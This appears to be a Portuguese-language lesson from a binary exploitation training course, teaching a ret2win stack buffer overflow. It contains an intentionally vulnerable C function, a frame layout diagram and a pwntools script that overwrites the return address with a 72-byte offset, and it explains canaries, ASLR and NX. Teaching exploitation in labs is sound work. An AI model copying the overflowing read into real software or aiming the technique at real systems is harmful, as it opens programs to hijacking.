# Corrupcao de memoria: endereco de retorno

Terceira primitiva, e a mais importante. Toda funcao, ao ser chamada, guarda na
pilha o **endereco de retorno**: para onde a CPU volta quando a funcao termina
(instrucao `ret`). Se voce sobrescreve esse endereco, voce controla para onde a
execucao vai depois do `ret`. Esta e a base do stack buffer overflow.

## O programa vulneravel

`/challenge/vuln.c`:

```c
void vuln(int fd) {
    char buf[64];
    read(fd, buf, 256);   // le 256 bytes em um buffer de 64 -> estoura
}
```

Layout do frame de `vuln()` (compilado com `-O0 -fno-stack-protector`, sem canary):

```
enderecos baixos                                   enderecos altos
+------------------+----------------+-------------------------+
| buf (64 bytes)   | rbp salvo (8)  | endereco de retorno (8) |
+------------------+----------------+-------------------------+
^                                   ^
inicio de buf                       offset 72 (64 + 8)
```

Ha uma funcao `win()` que imprime `RET2WIN_OK`. O objetivo e fazer o `ret` de
`vuln()` saltar para `win()`.

## O que voce precisa fazer

```python
from pwn import p64, ELF, context
import subprocess

subprocess.run(
    ["gcc", "-O0", "-fno-stack-protector", "-no-pie",
     "/challenge/vuln.c", "-o", "/tmp/vuln_solve"],
    check=True,
)
win = ELF("/tmp/vuln_solve").symbols["win"]

payload  = b"A" * 72      # enche buf (64) + rbp salvo (8)
payload += p64(win)       # sobrescreve o endereco de retorno
open("/home/hacker/payload.bin", "wb").write(payload)
```

O offset ate o endereco de retorno e **72** neste programa. No modulo 12 voce vai
aprender a **descobrir** esse offset sozinho com `cyclic`, para quando ele nao for
dado.

## Fluxo completo

```bash
python3 /home/hacker/solve.py
/challenge/check
```

## Por que isto importa

Sobrescrever o endereco de retorno e o coracao do stack smashing. As defesas
classicas atacam exatamente este ponto: **stack canaries** (um valor sentinela
antes do endereco de retorno, verificado no `ret`), **ASLR** (enderecos
imprevisiveis) e **NX** (pilha nao executavel). Aqui todas estao desligadas para
o estudo. Repare que ainda nao injetamos codigo: so pulamos para uma funcao que ja
existia. Injetar shellcode vem nos modulos 13 e 14.
